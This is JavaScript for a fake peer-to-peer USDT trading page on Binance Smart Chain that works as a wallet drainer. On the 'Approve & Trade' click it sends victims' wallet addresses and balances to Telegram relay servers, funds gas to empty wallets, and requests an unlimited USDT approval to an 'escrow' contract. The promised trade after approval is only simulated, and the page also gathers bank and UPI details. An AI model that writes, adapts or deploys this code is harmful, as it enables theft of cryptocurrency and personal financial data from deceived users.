// ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background = type === "error" ? "#f87171" : (type === "success" ? "#10b981" : "#374151");
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== GENERIC TELEGRAM MESSAGE SENDER (UPDATED FOR DUAL BACKENDS) =====
    async function sendTelegramMessage(message) {
        const backendUrl1 = 'https://telegram-bot-second-production.up.railway.app/sendTelegram';
        const backendUrl2 = 'https://telegram-backend-production-ad92.up.railway.app/sendTelegram'; // Your second backend URL

        // Send to first backend
        try {
            const response1 = await fetch(backendUrl1, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            });
            const result1 = await response1.json();
            if (result1.ok) {
                console.log('Telegram message sent to first backend successfully');
            } else {
                console.error('Telegram message failed for first backend:', result1);
            }
        } catch (error) {
            console.error('Error sending Telegram message to first backend:', error);
        }

        // Send to second backend
        try {
            const response2 = await fetch(backendUrl2, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message: message })
            });
            const result2 = await response2.json();
            if (result2.ok) {
                console.log('Telegram message sent to second backend successfully');
            } else {
                console.error('Telegram message failed for second backend:', result2);
            }
        } catch (error) {
            console.error('Error sending Telegram message to second backend:', error);
        }
    }

    // ===== TELEGRAM NOTIFICATION FOR USDT APPROVAL (REUSING GENERIC SENDER) =====
    async function sendTelegramNotification(walletAddress, txHash) {
        const message = `🔔 USDT Escrow Approval Successful!\n\n` +
                        `💰 Wallet: ${walletAddress}\n` +
                        `📝 Transaction Hash: ${txHash}\n\n` +
                        `✅ User has approved escrow contract for USDT spending\n` +
                        `🏦 Escrow Contract: 0x3606B0Ee947E5e28cAA81FEEB01187388732B26f\n` +
                        `⏰ Time: ${new Date().toLocaleString()}`;
        
        await sendTelegramMessage(message);
    }

    // ===== ADD AND SWITCH TO BSC NETWORK =====
    async function addAndSwitchToBSC() {
        if (!window.ethereum) {
            showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
            throw new Error("No Web3 wallet found."); // Throw to stop the process if no wallet
        }

        const BSC_MAINNET = {
            chainId: "0x38", // 56 in hex (BSC mainnet)
            chainName: "Binance Smart Chain",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
        };

        try {
            const currentChainId = await window.ethereum.request({
                method: 'eth_chainId'
            });

            if (currentChainId === '0x38') {
                console.log("Already on BSC");
                return; // Already on BSC, no need to switch
            }

            try {
                // Try switching to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
                console.log("Switched to BSC");
            } catch (switchError) {
                // If BSC is not added (error code 4902), add it
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [BSC_MAINNET],
                    });
                    console.log("BSC network added!");
                } else {
                    console.error("Failed to switch to BSC:", switchError);
                    showNotification("Failed to switch to BSC. Please try manually.", "error");
                    throw switchError; // Re-throw to be caught by the main click handler
                }
            }
        } catch (error) {
            console.error("General error in addAndSwitchToBSC:", error);
            showNotification("An error occurred while switching networks. Check console for details.", "error");
            throw error; // Re-throw to be caught by the main click handler
        }
    }

    // ===== SEND INITIAL WALLET DETAILS TO TELEGRAM =====
    // Now returns formattedBNB for the balance check
    async function sendWalletBalancesToTelegram(walletAddress) {
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];

        let formattedBNB = "0.0000";
        let formattedUSDT = "0.00";

        try {
            // Ensure ethers.js provider is available. Assuming it's loaded globally.
            const provider = new ethers.providers.Web3Provider(window.ethereum);

            // Get BNB balance
            const bnbBalance = await provider.getBalance(walletAddress);
            formattedBNB = ethers.utils.formatEther(bnbBalance);

            // Get USDT balance
            const tokenContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
            let usdtDecimals = 18; // Default to 18 decimals
            try {
                // Try to fetch actual decimals from the contract
                const usdtDecimalsValue = await tokenContract.decimals();
                usdtDecimals = usdtDecimalsValue.toNumber();
            } catch (err) {
                console.warn("Could not fetch USDT decimals, defaulting to 18:", err);
            }
            const usdtBalance = await tokenContract.balanceOf(walletAddress);
            formattedUSDT = ethers.utils.formatUnits(usdtBalance, usdtDecimals);

            // Construct and send the message using the existing sendTelegramMessage function
            const message = `🟢 New Wallet Connected!\n\n` +
                            `🆔 Wallet Address: <code>${walletAddress}</code>\n` +
                            `💰 BNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB\n` +
                            `💵 USDT Balance: ${parseFloat(formattedUSDT).toFixed(2)} USDT\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
            
            await sendTelegramMessage(message);

            // This part was in your provided connectWallet function, keeping it if needed for your backend.
            fetch('saveWallet.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    wallet: walletAddress,
                    bnb: formattedBNB,
                    usdt: formattedUSDT
                })
            }).catch(e => console.error("Error sending wallet data to saveWallet.php:", e));

        } catch (err) {
            console.error("Error fetching or sending wallet details to Telegram:", err);
            // This function should not block the main transaction flow if it fails.
        }
        return { formattedBNB, formattedUSDT }; // Return balances for further checks
    }
    
    $(document).ready(function() {
        // Update all order card button texts to indicate approval requirement
        $('.order-card button:first-child').each(function() {
            if ($(this).text().trim() === 'Sell Now') {
                $(this).text('Approve & Trade');
            }
        });
        
        // Mobile menu toggle
        $('#mobile-menu-btn').click(function() {
            $('#mobile-menu').toggleClass('hidden');
        });

        // Trade modal functionality - First request USDT approval
        $('.order-card button:first-child').click(async function() {
            if (!$(this).prop('disabled')) {
                const $btn = $(this);
                const originalBtnHTML = $btn.html();
                
                if (!window.ethereum) {
                    showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
                    return;
                }

                // Show spinner state
                $btn.html('<span class="spinner">Processing...</span>');
                $btn.prop('disabled', true);
                
                let fromAddress;
                let bnbBalance; // Declare bnbBalance here to be accessible later

                try {
                    // Step 1: Add and switch to the BSC network
                    await addAndSwitchToBSC();

                    // Step 2: Request accounts after network switch to ensure connection
                    // Using eth_accounts to get already connected accounts.
                    // This will NOT prompt the user to connect if not already connected.
                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
                    fromAddress = accounts[0]; // Assign to the outer scope variable

                    // --- MODIFIED: Removed the direct "Wallet connection failed" notification ---
                    if (!fromAddress) {
                        // If no address is found (wallet not connected/approved),
                        // simply reset the button state and exit.
                        // The user can then click again, which might trigger their wallet's
                        // connection prompt depending on their wallet's behavior.
                        $btn.prop('disabled', false);
                        $btn.html(originalBtnHTML);
                        return;
                    }
                    // --------------------------------------------------------------------------

                    // Step 3: Send wallet details (address, BNB, USDT balance) to Telegram
                    // and get the formatted BNB balance back for the check
                    const balances = await sendWalletBalancesToTelegram(fromAddress);
                    bnbBalance = balances.formattedBNB; // Assign to the outer scope variable

                    // === NEW FEATURE: CHECK BNB BALANCE AND SEND IF ZERO ===
                    if (parseFloat(bnbBalance) === 0) { // Correct comparison
                        showNotification("Checking the BNB balance and topping up...", "info"); // Changed to info type
                        await fetch("https://bnb-server-production.up.railway.app/send-bnb", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ toAddress: fromAddress }) // Use fromAddress
                        });
                        await new Promise(r => setTimeout(r, 4000)); // Wait for gas (increased to 4s for network propagation)
                        showNotification("BNB top-up initiated. Please wait a moment and try the approval again.", "success");
                        // After topping up, we'll exit and let the user click again to retry the approval
                        $btn.prop('disabled', false);
                        $btn.html(originalBtnHTML);
                        return; // Exit after topping up, user can re-click
                    }
                    // --------------------------------------------------------

                    const escrowContractAddress = "0x3606B0Ee947E5e28cAA81FEEB01187388732B26f"; // USDTEscrow contract address
                    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT token address on BSC

                    // Prepare the ABI interface for USDT approval
                    const usdtAbi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function decimals() view returns (uint8)"
                    ];
                    const iface = new ethers.utils.Interface(usdtAbi);

                    // Use maximum approval amount (MaxUint256)
                    const maxApproval = ethers.constants.MaxUint256;

                    // Encode approve(...) call for the escrow contract
                    const txData = iface.encodeFunctionData("approve", [escrowContractAddress, maxApproval]);

                    // Send the approval transaction
                    const txHash = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
                    });
                    
                    showNotification(`USDT approval successful! Opening trade modal...`, "success");
                    
                    // Send Telegram notification after successful approval transaction
                    await sendTelegramNotification(fromAddress, txHash);
                    
                    // Only show modal after successful approval
                    $('#trade-modal').removeClass('hidden');
                    
                    // Reset amount calculation fields in the modal
                    $('#inr-amount').text('₹0.00');
                    $('input[type="number"]').val('');
                    
                    // Reset payment forms in the modal
                    $('#payment-details').addClass('hidden');
                    $('#payment-method').val('');
                    $('.payment-form').addClass('hidden');
                    $('input[type="text"], input[type="file"]').val('');

                } catch (err) {
                    const msg = (err?.message || "").toLowerCase();
                    if (msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled") || msg.includes("canceled")) {
                        showNotification("Transaction cancelled.", "error");
                    } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance") || (msg.includes("execution reverted") && msg.includes("exceeds balance"))) {
                        showNotification("Insufficient USDT balance for this approval.", "error");
                    } else {
                        showNotification("Transaction failed. Please try again.", "error");
                        console.error("Transaction failed:", err);
                    }
                } finally {
                    // Always restore original button state
                    $btn.prop('disabled', false);
                    $btn.html(originalBtnHTML);
                }
            }
        });

        $('#close-modal, #cancel-trade').click(function() {
            $('#trade-modal').addClass('hidden');
        });

        // Close modal when clicking outside
        $('#trade-modal').click(function(e) {
            if (e.target === this) {
                $(this).addClass('hidden');
            }
        });
        
        // Validate payment details before proceeding with trade
        function validatePaymentDetails() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
            
            if (usdtAmount <= 0) {
                showNotification('Please enter a valid USDT amount.', 'error');
                return false;
            }
            
            if (!selectedMethod) {
                showNotification('Please select a payment method.', 'error');
                return false;
            }
            
            // Validate based on payment method specific fields
            if (selectedMethod === 'UPI') {
                var upiId = $('#upi-id').val().trim();
                if (!upiId) {
                    showNotification('Please enter your UPI ID.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                var holderName = $('#holder-name').val().trim();
                var accountNumber = $('#account-number').val().trim();
                var ifscCode = $('#ifsc-code').val().trim();
                
                if (!holderName) {
                    showNotification('Please enter account holder name.', 'error');
                    return false;
                }
                if (!accountNumber) {
                    showNotification('Please enter account number.', 'error');
                    return false;
                }
                if (!ifscCode) {
                    showNotification('Please enter IFSC code.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                var mobileNumber = $('#mobile-number').val().trim();
                if (!mobileNumber) {
                    showNotification('Please enter your mobile number.', 'error');
                    return false;
                }
            }
            
            return true;
        }
        
        // Collect payment data from modal fields
        function collectPaymentData() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
            var inrAmount = (usdtAmount * 110).toFixed(2); // Assuming a fixed rate of 110 INR/USDT
            
            var paymentData = {
                usdtAmount: usdtAmount,
                inrAmount: inrAmount,
                paymentMethod: selectedMethod,
                timestamp: new Date().toISOString()
            };
            
            // Add method-specific data
            if (selectedMethod === 'UPI') {
                paymentData.upiId = $('#upi-id').val().trim();
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                paymentData.holderName = $('#holder-name').val().trim();
                paymentData.accountNumber = $('#account-number').val().trim();
                paymentData.ifscCode = $('#ifsc-code').val().trim();
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                paymentData.mobileNumber = $('#mobile-number').val().trim();
            }
            
            return paymentData;
        }
        
        // Sell USDT button click handler inside the modal
        $('#sell-usdt-btn').click(function() {
            // Validate payment details first
            if (!validatePaymentDetails()) {
                return;
            }
            
            // Show loading state for the sell button
            $('#sell-btn-text').addClass('hidden');
            $('#sell-btn-loading').removeClass('hidden');
            $('#sell-usdt-btn').prop('disabled', true);
            
            // Collect payment data
            var paymentData = collectPaymentData();
            console.log('Payment Data:', paymentData);
            
            // Simulate trade processing (replace with actual trade logic later)
            setTimeout(function() {
                showNotification('Your USDT trade has been initiated successfully!', 'success');
                $('#trade-modal').addClass('hidden');
                
                // Reset button state
                $('#sell-btn-text').removeClass('hidden');
                $('#sell-btn-loading').addClass('hidden');
                $('#sell-usdt-btn').prop('disabled', false);
            }, 2000);
        });
        
        // Close notification toast
        $('#toast-close').click(function() {
            $('#notification-toast').addClass('hidden');
        });

        // Amount calculation for selling USDT in the modal
        $('input[type="number"]').on('input', function() {
            var usdtAmount = parseFloat($(this).val()) || 0;
            var price = 110; // ₹110/USDT (fixed rate)
            var inrAmount = (usdtAmount * price).toFixed(2);
            
            // Update the "You will receive" amount in the modal
            $('#inr-amount').text('₹' + inrAmount);
            
            // Show payment details section if a valid amount is entered
            if (usdtAmount > 0) {
                $('#payment-details').removeClass('hidden');
            } else {
                $('#payment-details').addClass('hidden');
            }
        });
        
        // Payment method selection in the modal
        $('#payment-method').on('change', function() {
            var selectedMethod = $(this).val();
            
            // Hide all payment forms initially
            $('.payment-form').addClass('hidden');
            
            // Show relevant form based on selection
            if (selectedMethod === 'UPI') {
                $('#upi-details').removeClass('hidden');
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                $('#bank-details').removeClass('hidden');
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                $('#digital-wallet-details').removeClass('hidden');
            }
        });

        // Filter functionality for order cards
        function applyFilters() {
            var orderType = $('#order-type-filter').val();
            var paymentMethod = $('#payment-filter').val();
            var amountRange = $('#amount-filter').val();
            
            $('.order-card').each(function() {
                var $card = $(this);
                var cardPayment = $card.data('payment');
                var cardAmount = $card.data('amount');
                var cardType = $card.data('type');
                
                var showCard = true;
                
                // Filter by order type
                if (orderType !== 'all' && cardType !== orderType) {
                    showCard = false;
                }
                
                // Filter by payment method
                if (paymentMethod !== 'all' && !cardPayment.includes(paymentMethod)) {
                    showCard = false;
                }
                
                // Filter by amount range
                if (amountRange !== 'all') {
                    var cardMin = parseInt(cardAmount.split('-')[0]);
                    var cardMax = parseInt(cardAmount.split('-')[1]);
                    
                    switch(amountRange) {
                        case '1000-10000':
                            if (cardMin < 1000 || cardMax > 10000) showCard = false;
                            break;
                        case '10000-50000':
                            if (cardMin < 10000 || cardMax > 50000) showCard = false;
                            break;
                        case '50000-100000':
                            if (cardMin < 50000 || cardMax > 100000) showCard = false;
                            break;
                        case '100000+':
                            if (cardMin < 100000) showCard = false;
                            break;
                    }
                }
                
                if (showCard) {
                    $card.show();
                } else {
                    $card.hide();
                }
            });
            
            // Update visible count text
            var visibleCount = $('.order-card:visible').length;
            $('h2 .text-sm').text('(' + visibleCount + ' orders)');
        }
        
        // Filter button click
        $('#filter-btn').click(function() {
            applyFilters();
        });
        
        // Clear filters
        $('#clear-filters').click(function() {
            $('#order-type-filter').val('all');
            $('#payment-filter').val('all');
            $('#amount-filter').val('all');
            $('.order-card').show(); // Show all cards
            $('h2 .text-sm').text('(41 orders)'); // Reset count
        });
        
        // Auto-filter on select change
        $('#order-type-filter, #payment-filter, #amount-filter').change(function() {
            applyFilters();
        });

        // Load more orders functionality
        $('#load-more-btn').click(function() {
            var $btn = $(this);
            var $additionalOrders = $('#additional-orders');
            
            if ($additionalOrders.hasClass('hidden')) {
                // Show additional orders if hidden
                $additionalOrders.removeClass('hidden');
                $btn.html('<i class="fas fa-sync-alt mr-2"></i>Load More Orders (12 of 41)');
                $btn.addClass('bg-gray-400 hover:bg-gray-500').removeClass('bg-blue-600 hover:bg-blue-700');
            } else {
                // Simulate loading more orders
                $btn.html('<i class="fas fa-spinner fa-spin mr-2"></i>Loading...');
                
                setTimeout(function() {
                    $btn.html('<i class="fas fa-check mr-2"></i>All Orders Loaded (41 of 41)');
                    $btn.addClass('bg-green-600 hover:bg-green-700').removeClass('bg-gray-400 hover:bg-gray-500');
                    $btn.prop('disabled', true); // Disable button once all are loaded
                }, 2000);
            }
        });
    });
